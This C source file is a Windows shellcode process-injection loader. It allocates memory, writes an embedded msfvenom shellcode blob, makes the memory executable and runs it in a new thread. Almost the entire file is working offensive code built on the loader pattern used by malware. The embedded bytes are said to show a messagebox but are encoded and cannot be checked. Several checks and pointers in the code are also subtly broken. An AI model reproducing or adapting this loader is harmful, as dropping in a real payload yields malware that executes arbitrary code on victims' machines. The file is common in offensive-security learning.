/* 
Title  : Basic Process Injection
Author : 34zY
Ressources : https://github.com/mhaskar/shellcode-process-injection/blob/master/Shellcode-Process-Injector.c
			 https://github.com/Alh4zr3d/ProcessInjectionPOCs/blob/main/CreateThread.nim

gcc CreateThread.c -o CreateThread.exe

*/

#include <stdio.h>
#include <windows.h>


	DWORD StartAddr;							// 32 bit of memory (Store LPVOID pointer)
	BOOL  CheckWriting;							// Boolean variable
	BOOL  CheckExec;							// Boolean variable
	// int*  Result;
	DWORD PrevPerm = 0;							// 32 biy of memory (Store PDWORD) previous permissions
	DWORD ThreadID;								// Receive the identifier of the new thread
	HANDLE NewThread;							// Handle (poignée)
	SIZE_T * bytesWritten;						// Pointer receive shellcodes bytes written in memory



int injectCreateThread(shellcode, size) {


	printf("\n[*] Interpreted shellcode structure : [%s] \n",shellcode);
	printf("[*] Size of the shellcode : %d",size);


// =========== ALLOCATE SPACE IN MEMORY ========= //

	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
	StartAddr = VirtualAlloc(
					
					NULL,						//Starting address of the region to allocate
					size,						//Size of the shellcode array
					MEM_COMMIT,					//Allocates memory charges
					PAGE_READWRITE
							);
	if(StartAddr==NULL){
		puts("\n[-] Error while get the base address to write\n");
	}
	else {
		printf("\n[+] Address to write 0x%x\n", StartAddr);
	}

// =========== WRITE SHELLCODE IN MEMORY ========= //

	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
	CheckWriting = WriteProcessMemory(
					
					GetCurrentProcess(),		//*HANDLE* GetCurrentProcess() https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
					(LPVOID)StartAddr,			//Starting address of the shellcode allocated memory
					(LPCVOID)shellcode,			//shellcode (LPCVOID)
					(SIZE_T)size,			    //nSize of the shellcode array
					bytesWritten				//Store the actual number of bytes written
							);

	printf("\n[DEBUG] Return value of WriteProcessMemory() : %d",CheckWriting);

	if(CheckWriting){
		printf("\n[-] Error while writing shellcode in memory\n");
		printf("[DEBUG] Bytes Written in memory : %d\n", bytesWritten);
	}
	else {
		printf("[+] Shellcode succesfully writed on adress 0x%x\n", StartAddr);
		printf("[DEBUG] Bytes Written in memory : %d\n", bytesWritten);
	}

// =========== VIRTUAL PROTECT (SET PRIVS) ========= //

	//https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
	CheckExec = VirtualProtect(
		
					(LPVOID)StartAddr,			//Starting address of the shellcode allocated memory
					size,						//Size of the shellcode array
					PAGE_EXECUTE_READ,			//Enables execute or read-only access to the committed region of pages.
					(PDWORD)PrevPerm
							);
	printf("\n[DEBUG] Return value of VirtualProtect() : %d",CheckExec);

// =========== CREATE THREAD ========= //

	//https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
 	NewThread = CreateThread(

 					NULL,						//Pointer to a struct that dermines inheritance (heritage) of the handle (poignée) by child processes. NULL prevents inheritance.
 					0,							//Starting size of the stack of the new thread. "0" indicates the default size for the EXE should be used
 					(LPTHREAD_START_ROUTINE)StartAddr,					//Pointer to beginning shellcode
 					NULL,						//Optional pointer to a variable to be passed to the thread
 					0,							//Creation flags for the new thread - "0" indicates the thread should execute immediately
 					(LPDWORD)ThreadID

 							);
 	printf("\n[DEBUG] Return value of CreateThread() : %d",NewThread);
}

int main(void)
{

// msfvenom -p windows/messagebox TEXT=test TITLE=test -f c -v shellcode

unsigned char shellcode[] =
	
	"\x2b\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
	"\xa3\xa9\xdc\xdb\x83\xee\xfc\xe2\xf4\x5f\x41\x5e\xdb\xa3\xa9"
	"\xbc\x52\x46\x98\x1c\xbf\x28\xf9\xec\x50\xf1\xa5\x57\x89\xb7"
	"\x22\xae\xf3\xac\x1e\x96\xfd\x92\x56\x70\xe7\xc2\xd5\xde\xf7"
	"\x83\x68\x13\xd6\xa2\x6e\x3e\x29\xf1\xfe\x57\x89\xb3\x22\x96"
	"\xe7\x28\xe5\xcd\xa3\x40\xe1\xdd\x0a\xf2\x22\x85\xfb\xa2\x7a"
	"\x57\x92\xbb\x4a\xe6\x92\x28\x9d\x57\xda\x75\x98\x23\x77\x62"
	"\x66\xd1\xda\x64\x91\x3c\xae\x55\xaa\xa1\x23\x98\xd4\xf8\xae"
	"\x47\xf1\x57\x83\x87\xa8\x0f\xbd\x28\xa5\x97\x50\xfb\xb5\xdd"
	"\x08\x28\xad\x57\xda\x73\x20\x98\xff\x87\xf2\x87\xba\xfa\xf3"
	"\x8d\x24\x43\xf6\x83\x81\x28\xbb\x37\x56\xfe\xc3\xdd\x56\x26"
	"\x1b\xdc\xdb\xa3\xf9\xb4\xea\x28\xc6\x5b\x24\x76\x12\x2c\x6e"
	"\x01\xff\xb4\x7d\x36\x14\x41\x24\x76\x95\xda\xa7\xa9\x29\x27"
	"\x3b\xd6\xac\x67\x9c\xb0\xdb\xb3\xb1\xa3\xfa\x23\x0e\xc0\xc8"
	"\xb0\xb8\x8d\xcc\xa4\xbe\xa3\xa9\xdc\xdb";
	
	int size = sizeof shellcode / sizeof *shellcode; //Size of the shellcode array
	injectCreateThread(shellcode, size);
	return 0;
}

